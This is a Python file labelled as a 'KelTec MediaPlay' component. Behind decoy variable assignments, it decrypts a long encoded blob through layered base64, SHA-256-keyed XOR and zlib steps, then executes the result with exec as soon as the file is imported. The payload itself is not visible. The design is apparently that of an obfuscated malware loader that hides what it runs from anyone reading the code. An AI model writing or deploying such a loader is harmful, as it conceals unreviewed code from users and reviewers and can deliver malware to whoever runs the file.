# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 775554 ^ 190578
_lx1_1 = len("cd8d16")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-297422)
_lx3_3 = 629433 * 0
_lx4_4 = 628064 ^ 151930
_K = '4579af77a3fb74adde691e8c304e172e5e70679c9e041749c3996cd5c11be0b4'
_M = 'gMCLmyV1D808GOlvwMANybibG91B3HTUe+IsFKSpMWWIg9/Idm5Hizce62XOlQHKuZhL2EzcItYs5XkUpqk1YtGChs0hbEKMZx7j'
_D = '=QPTditYk+5EF+chO8ulRuF8Hvc9I/yDHJ1tUE+kidZQQ1M0yIHFXFCUh6N+hNhwJX+bfb9eTwEq59ilswldjdkOpsUI/olKdNtPCfj81JCNLlOiap8lTHQLk6EvCvMjsTwtDNYx4LPVacsvirKJrJcgg5ruNcSmW5IY8+SAE6mrRpo4LgLSIVgI1Vw40cG6HaM3pPvGiwVSyk3wy3d0sRi6WQZi/oSbZwVyaNs2vv/6AC0hbc61Kser2wPXbZOUgeGN9KpP+GDMIrMmXJHgnL5YVVJebX8t36O22vrcYsuCIsDiUuELr4C3iHIubyXG8OPgvSF7USiKFZK0uSfUCta9Za05Qk+AAmxK8zkGNR9Cvkc8YErqovBH92NuotyW5D5OpuVp5v3dCfjX7mw8ATZFpDNwAcr16Q5Wi1tDtcJIroshf2ZFKZU3cvvPd75C33SBoAPxorDGt/PJmoeX/TVJb3s4kbmXXh2dC6rfu1/1aCCkPO6AgqBu7UF2pD3ZTyJHtYO1BAQiSq6ymjh84mz/+vxjVfXDtEwjaxTa0CNQPEX7wPu/G9898HBcoHxyKmI6l5M0QRGRdJ+3rBTTOSQaj/4U0K0c5TCNV73M2UzVuS7XMg81+SSV+xEOvmOqZSluBwxT/oiSSUwq4Js7QosiWBIn1OKK4zT/gQ/UG7Sf/mg1j49/wkq05GnzvNwMBBTo0MgzrfbSPLgJJ6CPpu9bQ0SZRfTuva0OYeiEP2E9vIIg65RCLXLTwSejBETzVzM+5paQnlm31P8j7hIR/UG+USbL4uOk4pJz2v4IJvCAg26I/ctpSdYlqlbNAlljK51xbKBAZEFosYxpX10norZviesgq5uaatIUKBsT/yUijIFl2RzQ/pRLC8i6JP+xVTargcEc8EGLLNdeae97gtm/GTqISp7kxJGwYBu02e9EuevBHH37iKR3Eu/cXwmQE3aSGM2e0hwT6wqGFkaWcGMQbaVIOSdFsHV3b0REJxIBcYoqPmefib18jyDOnFzcnogtIl1+eWETtU1154prsRp9c8t+Y67QX/D2WjjK1tXNMU/8tKo8gsQznPjalj95nY3MN1G0S2cTxpJGFwMBpPaYTKLMce0tu5kZE4B0tghmBG6UVnjqCo3juBf8J8s5O40YnykFeYRTauVEGMuIPyVEITkWtOe6AG0PrGxILQEXPHBq8vZaCoUNN/ipMEeBINkF3i98GAZV9NkkmqgJ8kpEKt3RhXVsfei45N3P7en54F9ewyj3Hdfh4NxhrALjjkTz6xobGVAno4vVCj6ztxiRSmCzApH1FBFoEcsj5lMgchZZC4vfMbvuGZHmfcbnlwEpfxrjg5WgXnplVYWcHfBoieu+D3M83nBH8bo84W7ZsJpN3QDZ2hhhPhoFyd8hmNGOntQN/NS/Wha8i6bePMklAZaN0ZjllJvazltw38KRi/A31QV39PZsqpmc2NDcFVNYvjRhwDE2Pcahl5Jx4aBR1MCA8+R8bQ0gIFFtSNHFlK4Z3NMjsCPUyoCOPlgH2D0e3Q23TK11PjZqGsdWlHd9+7TViXfJjO3hxH0383l67Po0J2g1+0MlbrYuv8NDrkQPCu+ESvJSDMLg47LOPufvPlWJWi4exlVIsgA5ki7DasUXSfc/vpDA'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})